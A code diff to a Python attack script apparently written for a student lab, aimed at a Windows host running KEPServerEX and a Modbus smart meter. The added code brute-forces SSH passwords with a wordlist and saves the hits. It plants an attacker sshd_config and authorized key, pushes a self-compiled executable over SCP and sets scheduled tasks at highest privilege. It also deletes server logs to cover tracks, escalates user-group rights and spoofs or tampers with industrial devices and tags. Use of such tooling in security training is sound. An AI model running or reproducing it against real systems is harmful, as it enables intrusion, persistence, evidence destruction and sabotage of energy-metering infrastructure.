@@ -21,6 +21,9 @@ import json
 import sys
 # from Powershell.callPowerShell import runPowerShellScript
 import paramiko
+from scp import SCPClient
+import socket
+import platform
 
 class AttackScript:
     def __init__(self, ip, username = "Student", password = "Student12345@"):
@@ -32,6 +35,16 @@ class AttackScript:
         self.PASSWORD = password
         self.WINDOWS_SERVER_IP = ip
 
+        # Set the path for the password brute force file
+        self.PASSWORD_FILE = path.join("resources", "rockyou.txt")
+
+        # Set the path for vulnerable sshd_config file and the access key
+        self.SSHD_CONFIG_PATH = path.join("resources", "vuln_sshd_config")
+        self.ACCESS_KEY_PATH = path.join("resources", "accessKey.pub")
+
+        # Set the path for the private SSH key
+        self.PRIVATE_KEY_PATH = path.join("resources", "accessKey")
+
         # Set the path for the shared directory
         self.COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
 
@@ -40,7 +53,8 @@ class AttackScript:
 
         # Path for the Modpoll
         # TODO: Either a modpoll path finder or make a modpoll unpacker
-        self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
+        # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
+        self.MODPOLL_PATH = "C:\\Users\\Student"
 
 
 ###########
@@ -62,45 +76,112 @@ class AttackScript:
     def ssh_run_command(self, command: str) -> str:
         """
         Runs a SINGLE command through ssh remotely and grab the output.
-        
+
         Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
 
+        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.
+
         Args:
-            command (str): Command to run.
-            host (str): IP Address of the remote device.
-            username (str): Username of the remote device.
-            password (str): Password of the remote device.
-        
+            command (str): The command to run on the remote server.
+            host (str): The hostname or IP address of the remote server.
+            username (str): The username to use for the SSH connection.
+            password (str): The password to use for the SSH connection.
+            private_key_path (str): The path to the private key file.
+
         Returns:
-            str: The output of the command ran
-
+            str: The output of the command.
         """
-        ssh_output: str = "" # Declare as string to prevent error proning
-        
-        if self.PASSWORD is None:
-            print("Using Hostkey? This is not implemented")
-            return
 
+        ssh_output: str = "" # Declare as string to prevent error proning
+
+        # Create an SSH client
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
-        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
-        ssh_output_list = ssh_stdout.readlines()
-        for line_no, line in enumerate(ssh_output_list):
-            ssh_output_list[line_no] = line.replace("\r\n", "\n")
-        ssh_output = "".join(ssh_output_list)
 
+        try:
+            # Connect to the remote server, prioritizing private key over password
+            if self.PRIVATE_KEY_PATH is not None:
+                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
+                # Connect using the private key
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
+            if self.PASSWORD is not None:
+                # Connect using password
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+            else:
+                # Handle case when neither password nor private key is provided
+                print("Please provide either a password or a private key.")
+                return None
+
+            # Placeholder for other code to run after successful connection
+            print("Connected to the remote server.")
+            # Run the command
+            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
+            ssh_output_list = ssh_stdout.readlines()
+            for line_no, line in enumerate(ssh_output_list):
+                ssh_output_list[line_no] = line.replace("\r\n", "\n")
+            ssh_output = "".join(ssh_output_list)
+
+        except paramiko.AuthenticationException:
+            print("Authentication failed. Please check your credentials.")
+            return None
+        except paramiko.SSHException as e:
+            print(f"An SSH error occurred: {e}")
+            return None
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            return None
+        ssh.close()
+        # Return the output
         return ssh_output
 
-    # Delete files in a specific folder
-    # TODO: Document this code, or remove it.
-    def delete_files(self,folder_path):
-        for root, dirs, files in walk(folder_path):
-            for file in files:
-                og = path.join(root, file)
-                dest = path.join(self.COPIED_PATH, file)
-                remove(og)
-                print("File: " + str(og) + " is deleted")
+    def scheduled_task_delete_files(self, folder_path) -> None:
+        """
+        # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
+        
+        Delete the smartmeter path prediodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
+        
+        Args:
+            folder_path (str):
+        """
+        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
+        # If the thing is ran locally
+        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
+            for root, dirs, files in walk(folder_path):
+                for file in files:
+                    og = path.join(root, file)
+                    #dest = path.join(self.COPIED_PATH, file)
+                    remove(og)
+                    print("File: " + str(og) + " is deleted")
+        
+        # Remotely transfer the exe and run attack 1, which will then run locally
+        else:
+            check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")
+
+            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
+                # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
+                if platform.system() != "Windows":
+                    raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
+                self.transfer_exe_remotely()
+
+            executable_file_path = f"{self.MODPOLL_PATH}/{path.basename(__file__).rsplit('.', 1)[0]}.exe" 
+
+            executable_file_parameters = '1'
+
+            task_name1 = 'Smart Meter Testing'
+            task_name2 = 'Smart Meter Testing 2'
+
+            # TODO: Run a native command prompt with task scheduler without cmd window appearing
+            # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
+
+            #sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
+            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+            # TODO: Test if the task scheduler works.
+            command_output_1 = self.ssh_run_command(sch1)
+            command_output_2 = self.ssh_run_command(sch2)
+            print(command_output_1); print(command_output_2)
+            print("\nOk.\n")
 
     def create_scheduled_task(self) -> None:
         """
@@ -347,7 +428,6 @@ class AttackScript:
             [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
         remove(dataFile)
 
-
     def recurseFiles(self,baseDirectory):
         #Scan a directory and return a list of all files
         for entry in scandir(baseDirectory):
@@ -407,7 +487,6 @@ class AttackScript:
 
         print("\nOk.\n")
 
-
     def clear_energy_reading(self) -> None:
         """
         TL:DR Run modpoll to clear energy reading.
@@ -436,7 +515,7 @@ class AttackScript:
         Bruteforces the usernames and passwords of the KEP Server.
         """
 
-        self.kep_server_start(self)
+        self.kep_server_start()
 
         usernames = ["Admin", "Administrator"]
         passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
@@ -511,7 +590,7 @@ class AttackScript:
         for baudrate in baudrate_list:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
             baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
-
+            print(baudrate_output)
             print(f"Checking baudrate {baudrate}:")
         
             if "[206]:" in baudrate_output:
@@ -521,7 +600,7 @@ class AttackScript:
             else:
                 print(f"Baudrate is not {baudrate}\n")
 
-        # NOTE: The kep_server_start() is removed as commands using this function will try to stop KEPServer anyways
+        # NOTE: The kep_server_start() is removed as commands using this function will try to start KEPServer anyways
         print("\nOk.\n")
 
         return found_baudrate
@@ -529,18 +608,15 @@ class AttackScript:
     def smartmeter_get_hardware_info(self):
         self.kep_server_stop()
 
-        current_directory = getcwd()
-        executable_path = current_directory + "\\modpoll.exe"
+        executable_path = self.MODPOLL_PATH + "\\modpoll.exe"
 
         baudrate = self.baudrate_check()
         if baudrate in ["4800", "9600", "19200"]:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
-            # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
-            # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
-            firmwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             parameters[9] = "9006" # DPM33 Address for reading hardwareOutput
-            hardwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             # TODO: For "cannot be detected" stuff, raise an exception
             if "[9005]:" in firmwareOutput:
@@ -565,8 +641,6 @@ class AttackScript:
 
         return
             
-
-
     # TODO: REVERT THIS THING PAIN.
     def revert(self,revert_option):
         # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
@@ -1019,35 +1093,137 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(server.get_info(), indent=4),file=sys.stdout)
 
+    ## USERS and USER GROUPS
+
     def kep_get_all_users(self):
         server = self.kep_connect()
         print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)
 
-    def kep_enable_user(self,user):
+    def kep_enable_user(self, user):
         server = self.kep_connect()
         print(admin.users.enable_user(server, user),file=sys.stdout)
 
-    def kep_disable_user(self,user):
+    def kep_disable_user(self, user):
         server = self.kep_connect()
         print(admin.users.disable_user(server, user),file=sys.stdout)
 
-    def kep_get_single_user(self,user):
+    def kep_get_single_user(self, user):
         server = self.kep_connect()
         print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
+
+    def kep_modify_user(self,user,description,password,groupname): ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change and password
+        server = self.kep_connect()
+        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": description, "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname, "libadminsettings.USERMANAGER_USER_PASSWORD": password}, user=user), indent=4))
+
+    def kep_add_user(self,user,groupname,password): ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
+        server = self.kep_connect()
+        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": user, "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname, "libadminsettings.USERMANAGER_USER_PASSWORD": password}))
+
+    def kep_del_user(self,user): ## ADDED to delete user
+        server = self.kep_connect()
+        print(admin.users.del_user(server, user))
+
+    def kep_add_user_group(self, usergroup): ### ADDED to add spoofed user group
+        server = self.kep_connect()
+        print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": usergroup}))
+
+    def kep_del_user_group(self, usergroup): ### ADDED to delete user group
+        server = self.kep_connect()
+        print(admin.user_groups.del_user_group(server, usergroup))
+
+    def kep_upgrade_user_group(self, usergroup): ### ADDED to let user modify user group to superuser
+        server = self.kep_connect()
+        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP", 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable", 
+                                                   "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": True , 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
+                                                   "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group=usergroup))
+    
+    def kep_downgrade_user_group(self, usergroup): ### ADDED to let user modify user group to superuser
+        server = self.kep_connect()
+        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP", 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": "Disable", 
+                                                   "libadminsettings.USERMANAGER_GROUP_ENABLED": False,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": False , 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_WRITE": False,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": False,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": False,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": False,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": False,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": False,
+                                                   "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": False,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": False}, user_group=usergroup))
+        
+    def kep_get_all_user_groups(self): ### ADDED to get all user groups
+        server = self.kep_connect()
+        print(json.dumps(admin.user_groups.get_all_user_groups(server), indent=4))
+
+    def kep_get_single_user_group(self, usergroup): ### ADDED to get single user group
+        server = self.kep_connect()
+        print(json.dumps(admin.user_groups.get_user_group(server, usergroup), indent=4))
+
+
+
+    ## CHANNEL AND DEVICE
 
     def kep_get_all_channels(self):
         server = self.kep_connect()
         print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))
 
+    def kep_add_spoofed_channel(self,channel_name): ### Added to add spoofed channel
+        server = self.kep_connect()
+        print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": channel_name, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial"}))
+
+    def kep_del_spoofed_channel(self,channel_name): ### Added to del spoofed channel
+        server = self.kep_connect()
+        print(connectivity.channel.del_channel(server, channel_name))
+
+    def kep_modify_channel(self,channel_name,new_channel_name): ### Added to modify channel
+        server = self.kep_connect()
+        print(connectivity.channel.modify_channel(server, {"common.ALLTYPES_NAME": new_channel_name}, channel=channel_name, force=True))
+
     def kep_get_all_devices(self,channel): # Example of a channel name is "SmartMeter"
         server = self.kep_connect()
         print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))
 
-    def kep_get_single_device(self,channel,device): # Example of a single device is "SmartMeter.ministicHACKED"
+    def kep_get_single_device(self, channel, device): # Example of a single device is "SmartMeter.ministicHACKED"
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
 
+    ## SPOOFED DEVICE
+  
     def kep_add_spoofed_device(self,channel,device):
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
@@ -1058,6 +1234,44 @@ class AttackScript:
         server = self.kep_connect()
         device_to_del = ".".join([channel, device])
         print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))
+
+    def kep_modify_device(self, channel, device, new_device_name, device_id): ### ADDED to change device ID to interrupt 
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device])
+        print(json.dumps(connectivity.device.modify_device(server, device_to_get, {"common.ALLTYPES_NAME": new_device_name,
+                                                                                    "servermain.DEVICE_ID_STRING": device_id,
+                                                                                    "servermain.DEVICE_ID_HEXADECIMAL": int(device_id),
+                                                                                    "servermain.DEVICE_ID_DECIMAL": int(device_id),
+                                                                                    "servermain.DEVICE_ID_OCTAL": int(device_id)}, force=True), indent=4))
+    
+    ## TAG FOR DEVICE
+
+    def kep_get_full_tag_structure(self,channel, device): ## ADDED to get full tag structure
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device])
+        print(json.dumps(connectivity.tag.get_full_tag_structure(server, device_to_get), indent=4))
+
+    def kep_get_single_tag(self,channel, device, tag): ## ADDED to get all tags
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device, tag])
+        print(json.dumps(connectivity.tag.get_tag(server, device_to_get), indent=4))
+
+    def kep_add_tag(self,channel, device, name, tag_address): ## ADDED to add tags
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device])
+        print(f"device_to_get={device_to_get}, name={name}, tag_address={tag_address}")
+        print(json.dumps(connectivity.tag.add_tag(server, device_to_get, {"common.ALLTYPES_NAME": name, "servermain.TAG_ADDRESS": tag_address}), indent=4))
+
+    def kep_del_tag(self,channel, device, name): ## ADDED to del tags
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device, name])
+        print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))
+
+    def kep_modify_tag(self,channel, device, name, new_name ): ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device, name])
+        print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True), indent=4))
+        # print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
 
     def disable_running_schedules(self) -> None:
         """
@@ -1104,7 +1318,7 @@ class AttackScript:
             print("Something went wrong!")
             return False
 
-    def kep_server_start(self):
+    def kep_server_start(self) -> bool:
         """
         Starts KEPServer service
 
@@ -1151,7 +1365,7 @@ class AttackScript:
             return True
         return False
     
-    def kep_get_windef_status(self) -> bool:
+    def get_windef_status(self) -> bool:
         """
         Get Windows Defender status
 
@@ -1164,7 +1378,7 @@ class AttackScript:
             return True
         return False
 
-    def kep_get_firewall_status(self):
+    def get_firewall_status(self):
         """
         Get Windows Firewall status
 
@@ -1181,7 +1395,230 @@ class AttackScript:
 
         print(results)
         return results
+    
+    def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
+        """
+        # TODO: from self.ssh_run_command, uses the same ssh paramiko client. May need to cut the paramiko client connection to its own function, then both self.scp_transfer_file and self.ssh_run_command can use the same ssh paramiko client function
 
+        Transfer the a file remotely from host to destination machine.
+
+        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
+
+        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.
+
+        Args:
+            command (str): The command to run on the remote server.
+            host (str): The hostname or IP address of the remote server.
+            username (str): The username to use for the SSH connection.
+            password (str): The password to use for the SSH connection.
+            private_key_path (str): The path to the private key file.
+            local_full_path (str): The local full path of the host machine, INCLUDING THE EXTENSION NAME
+            remote_full_path (str): The remote full path of the remote machine, INCLUDING THE EXTENSION NAME
+        """
+
+        # Create an SSH client
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            # Connect to the remote server, prioritizing private key over password
+            if self.PRIVATE_KEY_PATH is not None:
+                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
+                # Connect using the private key
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
+            if self.PASSWORD is not None:
+                # Connect using password
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+            else:
+                # Handle case when neither password nor private key is provided
+                print("Please provide either a password or a private key.")
+                return None
+
+            # Placeholder for other code to run after successful connection
+            print("Connected to the remote server.")
+            # Run the command
+
+            ssh_transport = ssh.get_transport()
+            ssh_transport.default_window_size = 2147483647
+            ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
+            ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
+            scp = SCPClient(ssh_transport, progress4=self.progress4)
+            scp.put(local_full_path, remote_path=remote_full_path)
+
+            # Close the SCP client
+            scp.close()
+            
+        except paramiko.AuthenticationException:
+            print("Authentication failed. Please check your credentials.")
+            return None
+        except paramiko.SSHException as e:
+            print(f"An SSH error occurred: {e}")
+            return None
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            return None
+        ssh.close()
+
+    def dummy_test(self) -> None:
+        print("Hello, I am very cooool")
+
+    def transfer_exe_remotely(self, remote_path=None):
+        """
+        Convert this current script to exe and transfer to the specified remote_path
+
+        Args:
+            remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
+        """
+        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
+        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+
+        if remote_path is None:
+            remote_path = self.MODPOLL_PATH
+            remote_path = path.normpath(remote_path)
+
+        remote_full_path = path.join(remote_path, executable_name).replace("\\", "/")
+
+        print(f"Path name is {remote_path}\\{executable_name}")
+        self.scp_transfer_file(f"dist/{executable_name}", remote_full_path)
+
+        #print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
+    
+    def progress4(self, filename, size, sent, peername):
+        sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (peername[0], peername[1], filename, float(sent)/float(size)*100) )
+
+    def ssh_brute_force(self) -> bool:
+        """
+        Attempts to brute force an SSH connection given a hostname, port, username, and password list file.
+
+        Args:
+            hostname (str): The hostname or IP address of the SSH server.
+            username (str): The username to use for the SSH connection.
+            password_file (str): The path to the password list file.
+
+        Returns:
+            bool: True if the SSH connection was successful, False otherwise.
+        """
+
+        # Create an SSH client using the Paramiko library
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # Read from the password list file and save it to a list
+        passwordList = []
+        with open(self.PASSWORD_FILE, "r") as f:
+            for line in f.readlines():
+                passwordList.append(line.strip())
+
+        # Attempt to connect to the SSH server using the username and password list
+        for password in passwordList:
+            try:
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=password)
+                # If the connection was successful, print the valid credentials
+                print(f"[*] Found valid credentials - Username: {self.USERNAME}, Password: {password}")
+
+                # Write the valid credentials to credentials.csv
+                # If the file does not exist, create it and write the header
+                try:
+                    with open("resources\\credentials.csv", "x") as f:
+                        f.write("username,password")
+                except FileExistsError:
+                    pass
+
+                with open("resources\\credentials.csv", "a") as f:
+                    f.write(f"\n{self.USERNAME},{password}")
+                    print("[*] Wrote valid credentials to credentials.csv")
+                
+                # Close the SSH connection
+                ssh.close()
+                return True
+            except paramiko.AuthenticationException:
+                print(f"[-] Invalid credentials - Username: {self.USERNAME}, Password: {password}")
+            except paramiko.SSHException as e:
+                print(f"[-] Unable to establish SSH connection: {e}")
+                sys.exit(1)
+            except paramiko.ssh_exception.NoValidConnectionsError as e:
+                print(f"[-] Unable to connect to the SSH server: {e}")
+                sys.exit(1)
+            except Exception as e:
+                print(f"[-] Error: {e}")
+                sys.exit(1)
+        
+        print("[!] Exhausted password list. Unable to find valid credentials.")
+        ssh.close()
+        return False
+    
+    def setup_ssh_config_and_key(self) -> bool:
+        """
+        Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
+        After running, you will then be able to use the access key to SSH into the target machine.
+
+        Args:
+            hostname (str): The hostname or IP address of the target Windows machine.
+            sshd_config_path (str): The path to the sshd_config file.
+            access_key_path (str): The path to the access key file.
+
+        Returns:
+            bool: True if the SSH connection was successful, False otherwise.
+        """
+
+         # Create SSH client
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            # Connect to the target Windows machine
+            ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+
+            # Create SCP client
+            scp = SCPClient(ssh.get_transport())
+
+            # Copy sshd_config to the target machine using SCP
+            scp.put(self.SSHD_CONFIG_PATH, remote_path='C:/ProgramData/ssh/sshd_config')
+
+            # Copy the access key to the target machine using SCP
+            scp.put(self.ACCESS_KEY_PATH, remote_path=f'C:/Users/{self.USERNAME}/.ssh/authorized_keys')
+
+            # Close the SCP and SSH clients
+            scp.close()
+
+            # Set access rule protection and permissions on authorized_keys file using pwsh.exe
+            acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{self.USERNAME}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'
+
+            ssh.exec_command(acl_cmd)
+
+            # Restart the SSH service (sshd) using pwsh.exe
+            ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')
+
+            # Close the SSH connection
+            ssh.close()
+            
+            print("Successfully inserted sshd_config and authorized_keys.")
+
+            # Cleanup and return True
+            ssh.close()
+            return True
+        
+        except paramiko.AuthenticationException:
+            print("Failed to authenticate to the target machine.")
+        except paramiko.SSHException as e:
+            print(f"An SSH error occurred: {e}")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+        # Cleanup and return False
+        ssh.close()
+        return False
+
+    def kep_delete_log_files(self):
+        """
+        Delete the log files to cover up tracks
+        """
+        # NOTE: REMINDER TO TEST THIS ON OTHER FOLDER FIRST.
+        log_files_to_delete = ["event.log", "transactions.log"]
+        kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
+        for log_file in log_files_to_delete:
+            self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
 
     ########
     # MAIN #
@@ -1193,7 +1630,10 @@ class AttackScript:
         #     check_admin()
 
         match attack_option:
-            case "1":  self.create_scheduled_task() # TODO: Determine if this function is depricated or can be modified
+            case "cool": self.dummy_test()
+            case "start": self.kep_server_start()
+            case "check": self.baudrate_check()
+            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH) # TODO: Determine if this function is depricated or can be modified
             #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
             case "3":  self.disable_firewall()
             case "4":  self.disable_ssh()
@@ -1218,6 +1658,9 @@ class AttackScript:
             case "23": self.kep_get_single_device()
             case "24": self.kep_delete_spoofed_device()
             case "25": self.kep_add_spoofed_device()
+            case "26": self.ssh_brute_force() # Move this up to be with the other ssh functions
+            case "27": self.setup_ssh_config_and_key() # Move this up to be with the other ssh functions
+            case "28": self.kep_delete_log_files()
             case "-h":
                 print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
             case _: print("Invalid Option! Use option \"-h\" for help!")
